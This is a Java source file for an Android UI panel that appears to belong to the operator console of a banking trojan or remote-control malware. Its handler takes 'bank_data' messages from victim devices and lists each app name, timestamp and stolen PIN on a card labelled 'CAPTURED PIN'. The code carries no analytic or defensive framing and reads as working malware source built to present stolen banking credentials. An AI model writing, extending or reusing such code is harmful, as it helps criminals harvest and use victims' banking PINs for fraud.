package com.device.ctrl;
import android.content.Context;
import android.view.Gravity;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
public class Bank extends BasePanel {
    private Device selDev;
    private LinearLayout content;
    private final SimpleDateFormat df = new SimpleDateFormat("MMM dd, HH:mm:ss", Locale.US);
    public Bank(Context ctx, int[] theme) { super(ctx, theme); }
    @Override
    public View buildView() {
        LinearLayout root = row(true);
        root.setPadding(20, 20, 20, 20);
        root.addView(sectionHeader("BANKING LOGS & DATA 🏦", null));
        content = row(true);
        content.setBackground(cardBg(0xFF0F131C, BORDER, 16));
        content.setPadding(16, 16, 16, 16);
        TextView tvPlaceholder = txt("Waiting for banking data...", 13, TXT2, false);
        content.addView(tvPlaceholder);
        ScrollView sc = new ScrollView(ctx);
        sc.addView(content, matchWrap());
        root.addView(sc, new LinearLayout.LayoutParams(-1, -1, 1f));
        return root;
    }
    @Override
    public void onDeviceSelected(Device d) {
        this.selDev = d;
    }
    @Override
    public void onMessage(JSONObject msg) {
        if ("bank_data".equals(msg.optString("type", ""))) {
            if (content.getChildCount() == 1 && content.getChildAt(0) instanceof TextView) {
                content.removeAllViews(); 
            }
            String app = msg.optString("app", "Unknown App");
            String pin = msg.optString("pin", "****");
            long time = msg.optLong("timestamp", System.currentTimeMillis());
            LinearLayout card = row(false);
            card.setBackground(cardBg(CARD, SUCCESS, 14));
            card.setPadding(16, 16, 16, 16);
            card.setGravity(Gravity.CENTER_VERTICAL);
            TextView tvIcon = txt("🅿️", 26, 0xFFFFFFFF, false);
            tvIcon.setBackground(circleBg(0x2A6366F1)); 
            tvIcon.setPadding(20, 20, 20, 20);
            card.addView(tvIcon, new LinearLayout.LayoutParams(-2, -2));
            LinearLayout info = row(true);
            info.setPadding(24, 0, 0, 0);
            info.addView(txt(app, 15, TXT1, true));
            info.addView(txt(df.format(new Date(time)), 11, TXT2, false));
            card.addView(info, new LinearLayout.LayoutParams(0, -2, 1f));
            LinearLayout pinBox = row(true);
            pinBox.setGravity(Gravity.END);
            pinBox.addView(txt("CAPTURED PIN", 9, SUCCESS, true));
            TextView tvPin = codeTxt(pin, 20, 0xFFFFFFFF, true);
            tvPin.setPadding(16, 8, 16, 8);
            tvPin.setBackground(cardBg(0xFF064E3B, SUCCESS, 10)); 
            LinearLayout.LayoutParams pinLp = new LinearLayout.LayoutParams(-2, -2);
            pinLp.topMargin = dp(4);
            pinBox.addView(tvPin, pinLp);
            card.addView(pinBox);
            LinearLayout wrap = new LinearLayout(ctx);
            wrap.setPadding(0, 0, 0, dp(12));
            wrap.addView(card, matchWrap());
            content.addView(wrap, 0); 
        }
    }
}
